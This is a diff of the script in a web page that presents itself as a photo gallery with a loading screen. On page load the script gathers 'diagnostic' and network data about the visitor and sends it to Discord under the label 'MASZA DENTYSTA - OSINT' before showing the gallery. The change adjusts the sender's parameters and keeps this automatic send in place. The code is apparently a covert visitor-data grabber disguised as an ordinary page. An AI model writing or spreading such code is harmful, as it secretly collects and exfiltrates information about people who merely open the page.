@@ -130,7 +130,7 @@ async function checkNetwork() {
     };
   }
 
-  async function sendReportToDiscord(data) {
+  async function sendReportToDiscord(data,ndata) {
     try {
       const payload = {
         username: "MASZA DENTYSTA - OSINT",
@@ -166,19 +166,17 @@ async function checkNetwork() {
 
   async function initialize() {
     const diagnosticData = collectDiagnostics();
-    const networkData = await checkNetwork(); // Dodane 'await'
-    await sendReportToDiscord(diagnosticData, networkData);
-}
+    const networkData = await checkNetwork();
 
-    // Krótkie opóźnienie dla płynności przejścia z loadera do galerii
+    await sendReportToDiscord(diagnosticData, networkData);
+
     await new Promise(resolve => setTimeout(resolve, 600));
 
-    // Schowaj loader, pokaż pełną galerię
     document.getElementById("loader-view").style.display = "none";
     document.getElementById("gallery").style.display = "block";
-  }
+}
 
-  window.addEventListener("DOMContentLoaded", initialize);
+window.addEventListener("DOMContentLoaded", initialize);
 </script>
 
 </body>
